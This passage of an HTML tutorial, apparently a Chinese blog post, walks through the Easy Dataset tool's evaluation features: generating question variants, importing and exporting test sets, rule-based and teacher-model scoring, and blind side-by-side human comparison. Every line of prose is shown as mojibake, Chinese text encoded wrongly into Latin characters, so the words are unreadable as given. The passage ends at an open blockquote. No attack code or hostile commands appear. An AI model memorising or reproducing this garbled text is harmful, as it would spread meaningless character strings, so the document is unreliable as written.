<p>å¦‚æœè®­ç»ƒé›†å¤ªå°‘æˆ–å¤šæ ·æ€§ä¸è¶³ï¼Œæ¨¡å‹æœ‰æ—¶å€™ä¼š â€œæ­»è®°ç¡¬èƒŒâ€ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠä¸€é“ç°æœ‰çš„æ•°æ®é›†é¢˜ç›®è‡ªåŠ¨æ”¹å†™ç”Ÿæˆè¯„ä¼°é›†å˜ä½“ï¼ˆæ¯”å¦‚æ¢ä¸ªé—®æ³•ï¼Œæˆ–è€…æŠŠé€‰æ‹©é¢˜æ”¹æˆåˆ¤æ–­é¢˜ï¼‰ï¼Œçœ‹çœ‹æ¨¡å‹æ˜¯ä¸æ˜¯çœŸçš„ç†è§£äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9f4928ed4fd4edb9d152f49aa5321fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=R6N5K11DTLnLoc2Njz8ftdi%2Bb1M%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡»ï¼šã€ç”Ÿæˆè¯„ä¼°é›†å˜ä½“ã€‘å¯ä»¥é€‰æ‹©è¦ç”Ÿæˆçš„é¢˜ç›®ç±»å‹å’Œæ•°é‡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a87b5c66261343e592fe59438650a671~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=PqxrxZdqRpQRlrFuznt%2FVK0LUU4%3D" alt="" loading="lazy"/></p>
<p>åœ¨å¸¸è§„çš„æ€è·¯ä¸­ï¼Œä¸€èˆ¬æˆ‘ä»¬è¦ä»æ‰€æœ‰æ•°æ®é›†ä¸­åˆ’åˆ†å‡ºä¸€å®šæ¯”ä¾‹ï¼ˆå¦‚ 15%ï¼‰ä½œä¸ºæµ‹è¯•é›†ã€‚</p>
<p>ä½†æ˜¯ï¼Œåœ¨å°è§„æ¨¡çš„æ•°æ®é›†ä¸Šï¼Œå¦‚æœç›´æ¥åˆ’åˆ†å‡ºä¸€å®šæ¯”ä¾‹çš„æµ‹è¯•é›†å¯èƒ½ä¼šå¯¼è‡´åŸæœ‰çš„è®­ç»ƒé›†æ•°é‡å’Œå¤šæ ·æ€§ä¸è¶³ï¼Œå¯¼è‡´æ¨¡å‹è®­ç»ƒæ•ˆæœå·®ã€‚</p>
<p>å¦‚æœä½¿ç”¨ <code>Easy Dataset</code> ç”Ÿæˆçš„æ•°æ®é›†ï¼Œæˆ‘ä»¬å¯ä»¥å…¨éƒ¨ç”¨äºè®­ç»ƒé›†ï¼Œå¦å¤–ä¸€éƒ¨åˆ†æµ‹è¯•é›†æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ç°æœ‰çš„æ•°æ®é›†ä¸Šç”Ÿæˆå˜ä½“ï¼Œæˆ–é‡æ–°ä»æ–‡æœ¬å—æå–ã€‚è¿™æ ·æ—¢èƒ½ä¿è¯è®­ç»ƒé›†çš„å¤šæ ·æ€§ä¸ä¼šå—åˆ°æŸå¤±ï¼Œè¿˜èƒ½ä¿è¯æœ‰è¶³å¤Ÿä¸°å¯Œçš„æµ‹è¯•é›†æ¥æ”¯æ’‘æœ€ç»ˆæ¨¡å‹æ•ˆæœçš„è¯„ä¼°ã€‚</p>
<h4 data-id="heading-13">å¯¼å…¥å¯¼å‡ºæµ‹è¯•é›†</h4>
<p>å¦‚æœä½ å·²ç»æœ‰å‡†å¤‡å¥½çš„æµ‹è¯•é›†ï¼Œåªæ˜¯æƒ³ä½¿ç”¨ <code>Easy Dataset</code> æ¥åšè¯„ä¼°ä»»åŠ¡ï¼Œå¯ä»¥åˆ°ã€è¯„ä¼°-è¯„ä¼°æ•°æ®é›†ã€‘æ¨¡å—ç›´æ¥è¿›è¡Œå¯¼å…¥ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d4720bd8e1f49efa79e7083ab1308ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=0ehA3YwrkJQbLbq9AfqSn%2F5lZDc%3D" alt="" loading="lazy"/></p>
<p>ç›®å‰æ”¯æŒä» <code>JSONã€XLSã€XLSX</code> å‡ ç§ç±»å‹çš„æ–‡ä»¶è¿›è¡Œå¯¼å…¥ï¼Œéœ€è¦å°†æ–‡ä»¶å¤„ç†æˆè§„å®šæ ¼å¼ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f3e3893fc554dfb841e3f596d8e6df0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=u4oHme5Z%2F9txz78y9w9xjCy7jaU%3D" alt="" loading="lazy"/></p>
<p>ä½ å¯ä»¥ç›´æ¥ä¸‹è½½å¯¹åº”é¢˜å‹å’Œæ–‡ä»¶ç±»å‹çš„æ¨¡ç‰ˆï¼Œç„¶åæŒ‰ç…§æ¨¡ç‰ˆè¿›è¡Œè¡¥å……ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae275ad3b906470f8c1d009669ebe36e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=cfRU9Wjt8%2Fys8hAua367%2F9GwvpM%3D" alt="" loading="lazy"/></p>
<p>å¦å¤–ï¼Œå¹³å°è¿˜å†…ç½®äº†ä¸°å¯Œçš„é¢†åŸŸçŸ¥è¯†æ•°æ®é›†ï¼Œå¦‚æœä½ æƒ³æµ‹è¯•æ¨¡å‹åœ¨ç‰¹å®šé¢†åŸŸä¸‹çš„è¡¨ç°ï¼Œå¯ä»¥ç›´æ¥é€‰æ‹©ã€å¯¼å…¥å†…ç½®æ•°æ®é›†ã€‘å¹¶é€‰æ‹©å¯¹åº”å­¦ç§‘è¿›è¡Œå¯¼å…¥ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32778826ddc7415c948c69d6575eaa48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=mf%2FVaB8vUlPXhk2iEzwLFYTaslo%3D" alt="" loading="lazy"/></p>
<p>æ¯ä¸ªå­¦ç§‘ä¸‹éƒ½å†…ç½®äº†å‡ ç™¾é“ä¸åŒéš¾åº¦çš„é¢˜ç›®ï¼ˆå¤§éƒ¨åˆ†ä¸ºå•é€‰æˆ–å¤šé€‰é¢˜ï¼‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c96570a3a764814bbcb3e1006e6e5f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=0Bfp%2BsL2g5Qpjy%2Fqi%2FgnyK07CoE%3D" alt="" loading="lazy"/></p>
<p>æµ‹è¯•é›†å¤„ç†å®Œæˆåï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è¿›è¡Œå¯¼å‡ºï¼ˆæ”¯æŒè‡ªå®šä¹‰å¯¼å‡ºèŒƒå›´å’Œæ ¼å¼ï¼‰ï¼Œä½ å¯ç”¨äºå…¶ä»–è¯„ä¼°ç³»ç»Ÿï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e1d4e7954c943acb85bb527b8db94f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=2IRLLCEVB1fWrD9yo2yqDAxIhn4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">2. æ€ä¹ˆæ‰“åˆ†ï¼Ÿï¼ˆè‡ªåŠ¨è¯„ä¼°ä»»åŠ¡ï¼‰</h3>
<p>é¢˜å‡ºå¥½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è®©ä¸šåŠ¡æ¨¡å‹æ¥åšé¢˜ï¼Œç³»ç»Ÿæ¥åˆ¤å·ã€‚ç³»ç»Ÿæ”¯æŒä¸¤ç§é˜…å·æ¨¡å¼ï¼š</p>
<h4 data-id="heading-15">æ¨¡å¼ä¸€ï¼šç›´æ¥è®¡ç®—å¾—åˆ†ï¼ˆé’ˆå¯¹å®¢è§‚é¢˜ï¼‰</h4>
<p>å¯¹äº<strong>åˆ¤æ–­é¢˜ã€å•é€‰é¢˜ã€å¤šé€‰é¢˜</strong>ï¼Œç­”æ¡ˆæ˜¯å”¯ä¸€çš„ã€‚
ç³»ç»Ÿä¸éœ€è¦è°ƒç”¨å¤§æ¨¡å‹ï¼Œç›´æ¥ç”¨è§„åˆ™ä»£ç æ¯”å¯¹ã€‚</p>
<p>æˆ‘ä»¬æ¥åˆ°ã€è¯„ä¼°-è‡ªåŠ¨è¯„ä¼°ä»»åŠ¡ã€‘æ¨¡å—ï¼Œç‚¹å‡»åˆ›å»ºä»»åŠ¡ï¼Œæ‚¨å¯ä»¥åŒæ—¶å‹¾é€‰å¤šä¸ªæ¨¡å‹ï¼Œç³»ç»Ÿä¼šå¹¶å‘æ‰§è¡Œå¤šä¸ªä»»åŠ¡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/418f1e4b15ad41268dca5088351da9ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=FBUHmgA%2BuhuPNmxqtBLDSfesKZE%3D" alt="" loading="lazy"/></p>
<p>å°±åƒè¦çœŸå®è¦å¯¹æ¨¡å‹è¿›è¡Œä¸€åœºè€ƒè¯•ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥é…ç½®æœ¬æ¬¡ â€œè€ƒå·â€ çš„å…·ä½“é¢˜ç›®èŒƒå›´ï¼š</p>
<ul>
<li><strong>é¢˜å‹ç­›é€‰</strong>ï¼šæ¯”å¦‚æœ¬æ¬¡ä¹‹è€ƒå¯Ÿé€‰æ‹©é¢˜å’Œåˆ¤æ–­é¢˜ã€‚</li>
<li><strong>æ ‡ç­¾ç­›é€‰</strong>ï¼šæ¯”å¦‚åªè€ƒæŸ¥æ ‡ç­¾ä¸º <code>åŒ»ç–—çŸ¥è¯†</code> çš„é¢˜ç›®ã€‚</li>
<li><strong>åŠ¨æ€é‡‡æ ·</strong>ï¼šå¦‚æœæ‚¨æƒ³å¿«é€Ÿè·å¾—ç»“æœï¼Œå¯ä»¥ä» 1000 é“é¢˜ä¸­éšæœºæŠ½æ · 50 é“ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce8d7497beb740cb8abd475537c55ccc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=u32ZtfMpZDNW0I7OBrxbQEMK%2FEU%3D" alt="ä»»åŠ¡æ‰§è¡Œä¸­" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79a68f82299141ab9ec1e4d50eec1351~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=yfhUR2HJIY9Kgh70hzDlmJt792o%3D" alt="ä»»åŠ¡æ‰§è¡Œå®Œæˆ" loading="lazy"/></p>
<p>è¿›å…¥è¯„ä¼°ä»»åŠ¡è¯¦æƒ…ï¼Œä½ å¯ä»¥çœ‹åˆ°æ¨¡å‹åœ¨ä¸åŒé¢˜ç›®ä¸Šçš„å…·ä½“å¾—åˆ†æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®é¢˜ç›®å›ç­”ç»“æœï¼ˆæ­£ç¡®/é”™è¯¯ï¼‰ä»¥åŠé¢˜ç›®ç±»å‹ï¼ˆåˆ¤æ–­ã€å•é€‰ã€å¤šé€‰ï¼‰è¿›è¡Œç­›é€‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56629816f35b4a5ba2b001c4ebafb7fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=gIGcBjTtGGN%2BVQbVvcVKjEPFdOI%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-16">æ¨¡å¼äºŒï¼šæ•™å¸ˆæ¨¡å‹è¯„ä¼°ï¼ˆé’ˆå¯¹ä¸»è§‚é¢˜ï¼‰</h4>
<p>å¯¹äºå®¢è§‚é¢˜ï¼ˆé€‰æ‹©ã€åˆ¤æ–­ï¼‰ï¼Œç³»ç»Ÿå¯ä»¥è‡ªåŠ¨å¯¹é½ç­”æ¡ˆã€‚ä½†å¯¹äº <strong>ç®€ç­”é¢˜</strong> å’Œ <strong>å¼€æ”¾é¢˜</strong>ï¼Œç­”æ¡ˆå¾€å¾€æ˜¯å¤šæ ·åŒ–çš„ã€‚æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸€ä¸ªæ›´æ™ºæ…§çš„ â€œæ•™å¸ˆæ¨¡å‹â€ï¼ˆå°±åƒåˆ¤æ–­è€å¸ˆä¸€æ ·ï¼‰ å¯¹æµ‹è¯•æ¨¡å‹çš„å›ç­”è¿›è¡Œæ·±åº¦è¯„æµ‹ï¼Œç»™å‡ºé‡åŒ–çš„åˆ†æ•°å’Œå®šæ€§çš„è¯„è¯­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/312f4c8f116a4654905c19c10b0815fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=OCdaAlZ8CKyD6e7nMESfw84k%2BNM%3D" alt="" loading="lazy"/></p>
<p>ç³»ç»Ÿå†…ç½®äº†ä¸€ä»½è¯„åˆ†æ ‡å‡†ï¼Œä¸è¿‡é€šç”¨çš„æ ‡å‡†æ¯”è¾ƒå®½æ³›ï¼Œä¸ä¸€å®šé€‚ç”¨äºæ‰€æœ‰åœºæ™¯ï¼Œå¦‚æœä½ æƒ³å¾—åˆ°æ›´å‡†ç¡®çš„è¯„ä¼°ç»“æœï¼Œå»ºè®®æ ¹æ®å®é™…ä¸šåŠ¡åœºæ™¯å’Œæ•°æ®é›†çš„ç‰¹ç‚¹å®šåˆ¶å…·ä½“çš„è¯„åˆ†è§„åˆ™ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b274baae7064d57a18e11eb36f81fb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=QCPVvyQRBoNCkhzbr%2FA2%2Bjd6D6g%3D" alt="" loading="lazy"/></p>
<p>åœ¨è¯„ä¼°æŠ¥å‘Šè¯¦æƒ…ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°æ¯ä¸ªé¢˜ç›®çš„å…·ä½“å¾—åˆ†ï¼Œæ•™å¸ˆæ¨¡å‹çš„æ‰“åˆ†ä»¥åŠå…·ä½“çš„æ‰“åˆ†ç†ç”±ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33f31315d0414e32893fa59a1c7ff815~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=mKF70N1TjWPegx%2FTDVEotWOAxEI%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>å»ºè®®ï¼š</p>
<ul>
<li>åŒä¸€å¥—è¯„ä¼°é•¿æœŸå¯¹æ¯”æ—¶ï¼Œå°½é‡å›ºå®šæ•™å¸ˆæ¨¡å‹ä¸è¯„åˆ†é…ç½®ï¼Œå¦åˆ™åˆ†æ•°ä¸å¯ç›´æ¥æ¨ªå‘å¯¹æ¯”</li>
<li>å…ˆåœ¨å°æ ·æœ¬ï¼ˆå¦‚ 20 é¢˜ï¼‰è·‘é€šï¼Œç¡®è®¤è£åˆ¤æ ‡å‡†ç¬¦åˆé¢„æœŸï¼Œå†æ‰©å¤§è§„æ¨¡</li>
</ul>
</blockquote>
<h3 data-id="heading-17">3. äººå·¥ç›²æµ‹ï¼šå›å½’çœŸå®ç›´è§‰çš„ â€œç«æŠ€åœºâ€</h3>
<p>è™½ç„¶è‡ªåŠ¨åŒ–è¯„ä¼°å¾ˆæ–¹ä¾¿ï¼Œä½†åœ¨æ¨¡å‹ä¸Šçº¿çš„æœ€åé˜¶æ®µï¼Œæˆ–è€…ä¸¤ä¸ªæ¨¡å‹åˆ†æ•°å’¬å¾—å¾ˆæ­»çš„æ—¶å€™ï¼Œè¿˜æ˜¯éœ€è¦äººæ¥çœ‹ä¸€çœ¼ã€‚</p>
<blockquote>
<p><strong>ç›²æµ‹ä»»åŠ¡æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li>ç›²æµ‹ä»»åŠ¡ = æŠŠå¤šä¸ªæ¨¡å‹çš„å›ç­”â€œåŒ¿ååŒ–â€ï¼Œè®©è¯„å®¡è€…åªçœ‹å›ç­”è´¨é‡åšé€‰æ‹©/æ‰“åˆ†</li>
<li>é€‚åˆï¼š
<ul>
<li>ä½ å¸Œæœ›æ’é™¤â€œæ¨¡å‹ååè§â€</li>
<li>ä½ æ›´åœ¨æ„ä¸»è§‚ä½“éªŒï¼ˆå¯è¯»æ€§ã€é£æ ¼ã€è¯´æœåŠ›ã€å®Œæ•´æ€§ç­‰ï¼‰</li>
<li>å¼€æ”¾é¢˜/å¯¹è¯å‹å†…å®¹çš„æœ€ç»ˆè´¨é‡è¯„ä¼°</li>
</ul>
</li>
</ul>
</blockquote>
<p>å°±åƒåœ¨ä¸Šä¸ªç« èŠ‚ä¸­æˆ‘ä»¬è®²åˆ°åˆ° <code>LMArena</code>ï¼Œäººå·¥ç›²æµ‹å¯¹äºå‚ç›´é¢†åŸŸçš„æ¨¡å‹è¯„ä¼°åŒç­‰é‡è¦ï¼Œåœ¨å®é™…æµ‹è¯•ä¸­ï¼Œç³»ç»Ÿä¼šéšè—ä¸¤ä¸ªæ¨¡å‹çš„å›ç­”ç»“æœï¼Œè¯„åˆ¤è€…ä»…æ ¹æ®å›ç­”çš„è´¨é‡ã€é€»è¾‘ã€è¯­æ°”è¿›è¡Œä¸»è§‚åˆ¤æ–­ï¼Œå½»åº•æ¶ˆé™¤å¯¹ç‰¹å®šå“ç‰Œçš„å›ºæœ‰åè§ã€‚</p>
<p>æˆ‘ä»¬æ¥åˆ°ã€è¯„ä¼°-äººå·¥ç›²æµ‹ä»»åŠ¡ã€‘æ¨¡å—ï¼Œç„¶åç‚¹å‡»åˆ›å»ºä»»åŠ¡ï¼Œç„¶åé…ç½®ï¼š</p>
<ul>
<li><strong>ä¸¤ä¸¤å¯¹æ¯”</strong>ï¼šä»æ¨¡å‹åº“ä¸­é€‰æ‹©ä¸¤ä¸ªä½ æœ€æƒ³å¯¹æ¯”çš„æ¨¡å‹ã€‚</li>
<li><strong>é¢˜ç›®èŒƒå›´</strong>ï¼šé€‰æ‹©ç®€ç­”é¢˜æˆ–å¼€æ”¾é¢˜å¹¶è®¾ç½®æŠ½æ ·æ•°é‡ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a285420962c456898a224517afe4637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=Ygmq4EgT76Cfelwmy0nE6bLzip4%3D" alt="" loading="lazy"/></p>
<p>ä»»åŠ¡å¼€å¯åï¼Œæ‚¨å°†è¿›å…¥ä¸€ä¸ªç±»ä¼¼ <strong>Chatbot Arena</strong> çš„æ²‰æµ¸å¼çš„å¯¹æ¯”ç•Œé¢ï¼š</p>
<ul>
<li><strong>å·¦å³å¯¹ç…§</strong>ï¼šå·¦è¾¹å±•ç¤ºå€™é€‰ A çš„å›ç­”ï¼Œå³è¾¹å±•ç¤ºå€™é€‰ B çš„å›ç­”ï¼Œä½†ä¸å‘Šè¯‰æ ‡æ³¨äººå‘˜å…·ä½“æ˜¯å“ªä¸ªæ¨¡å‹ã€‚</li>
<li><strong>æµå¼åŠ è½½</strong>ï¼šç³»ç»Ÿæ”¯æŒæµå¼è¾“å‡ºï¼Œæ‚¨å¯ä»¥å®æ—¶çœ‹åˆ°æ¨¡å‹çš„ç”Ÿæˆè¿‡ç¨‹ã€‚</li>
<li><strong>å››é€‰ä¸€æŠ•ç¥¨</strong>ï¼šæ ‡æ³¨äººå‘˜åªéœ€è¦æ ¹æ®ç›´è§‚æ„Ÿå—ï¼Œé€‰æ‹©â€œå·¦è¾¹å¥½â€ã€â€œå³è¾¹å¥½â€æˆ–è€…â€œå¹³å±€â€ã€‚
<ul>
<li><strong>ğŸ‘ˆ å·¦è¾¹æ›´å¥½</strong>ï¼šå·¦ä¾§å›ç­”åœ¨å‡†ç¡®æ€§ã€æµç•…åº¦æˆ–å®‰å…¨æ€§ä¸Šæ›´ä¼˜ã€‚</li>
<li><strong>ğŸ‘‰ å³è¾¹æ›´å¥½</strong>ï¼šå³ä¾§å›ç­”æ›´ç¬¦åˆä½ çš„é¢„æœŸã€‚</li>
<li><strong>ğŸ¤ å¹³å±€</strong>ï¼šä¸¤è€…éš¾åˆ†ä¼¯ä»²ï¼Œæˆ–éƒ½å­˜åœ¨æ˜æ˜¾çš„ä¸¥é‡é”™è¯¯ã€‚</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c547fb0ce7b34e45ac5571c2f5826283~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=6aBpZxSeH7kH%2Fi1vWAktb6DMMi8%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>è¿™ç§ Side-by-Side çš„æ¯”è¾ƒæ•°æ®ï¼Œæ˜¯ç›®å‰å…¬è®¤æœ€ç¬¦åˆäººç±»çœŸå®ä½“æ„Ÿçš„è¯„ä¼°æ–¹å¼ã€‚</p>
</blockquote>
<p>å½“æ‰€æœ‰é¢˜ç›®æŠ•ç¥¨å®Œæˆåï¼Œç³»ç»Ÿä¼š â€œæ­æ™“è°œåº•â€ å¹¶ç”Ÿæˆèƒœç‡ç»Ÿè®¡ï¼Œç³»ç»Ÿå°†å±•ç¤ºæ¯ä¸ªæ¨¡å‹åœ¨å¯¹æ¯”ä¸­è·èƒœçš„ç™¾åˆ†æ¯”ã€‚å¦‚æœå¹³å±€è¾ƒå¤šï¼Œè¯´æ˜è¿™ä¸¤ä¸ªæ¨¡å‹åœ¨å½“å‰é¢˜åº“ä¸‹çš„è¡¨ç°éå¸¸æ¥è¿‘ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b4b6f87ce4a4acca5c93370e4df418d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=2uiIcrN1RBn6zCHf%2F5pRAChldf4%3D" alt="" loading="lazy"/></p>
<p>ä½ è¿˜å¯ä»¥å›é¡¾å…·ä½“æŸä¸ªé¢˜ç›®çš„å›ç­”ç»“æœï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79e1b67cd96f458bbc4ed348d89b88b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=oT6dZMGZXMmUw9quD6UhvERQEwU%3D" alt="" loading="lazy"/></p>
<p>å›åˆ°ä»»åŠ¡åˆ—è¡¨ï¼Œæˆ‘ä»¬èƒ½æ¸…æ™°çš„çœ‹åˆ°æ¯æ¬¡ç›²æµ‹ä»»åŠ¡çš„ç»“æœï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30fb91c3cdd6477eb1d8d691a0c16ed5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=J0vetIzt7%2BzZFpsfpWkmeqe0Lx8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-18">4. é«˜çº§ç”¨æ³•ï¼šè‡ªå®šä¹‰è¯„ä¼°</h3>
<p>å¦‚æœä½ æœ‰æ›´å®šåˆ¶åŒ–çš„æ¨¡å‹è¯„ä¼°éœ€æ±‚ï¼ˆå¦‚éœ€è¦å®šåˆ¶å¤„ç†çš„é£æ ¼å’Œä¾§é‡ç‚¹ã€å¸Œæœ›æ•™å¸ˆæ¨¡å‹æ›´å…³æ³¨æŸäº›ç‰¹å®šç»´åº¦ï¼‰ï¼Œå¯ä»¥åˆ°ã€æ›´å¤š-é¡¹ç›®è®¾ç½®-æç¤ºè¯é…ç½®æ¨¡å‹ã€‘å¯¹æ¨¡å‹è¯„ä¼°çš„æç¤ºè¯è¿›è¡Œæ›´æ”¹ï¼Œç³»ç»Ÿå…¨é¢å¼€æ”¾äº†è¯„ä¼°ç³»ç»Ÿçš„å…¨å¥—æç¤ºè¯ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>ä»é¢†åŸŸæ–‡çŒ®ç”Ÿæˆæµ‹è¯•é›†çš„æç¤ºè¯ï¼šåˆ¤æ–­é¢˜ã€å•é€‰é¢˜ã€å¤šé€‰é¢˜ã€ç®€ç­”é¢˜ã€å¼€æ”¾é—®é¢˜çš„ç”Ÿæˆ</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95cfa6f145294b40b075218d0cc3513f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=nPwAeQdzjgV1etNYKsJIRN8JVxM%3D" alt="" loading="lazy"/></p>
<ul>
<li>ä¸åŒé¢˜ç›®æ‰§è¡Œæµ‹è¯„çš„æç¤ºè¯ï¼šä»åŸå§‹é¢˜ç›®è·å–ç­”æ¡ˆ</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99912934edb04fb7ab1319a01d33a5e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=P1iXgr%2BLV1X%2Bs3AHU3peCxjLaKo%3D" alt="" loading="lazy"/></p>
<ul>
<li>LLM è¯„ä¼°æç¤ºè¯ï¼šåŒ…æ‹¬ç®€ç­”é¢˜å’Œå¼€æ”¾é—®é¢˜çš„è¯„ä¼°</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6bddf44817b4e8389f0e515f631d79c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=v2J2tU1p7ju3OR7iueeVqNNzs5o%3D" alt="" loading="lazy"/></p>
<blockquote>
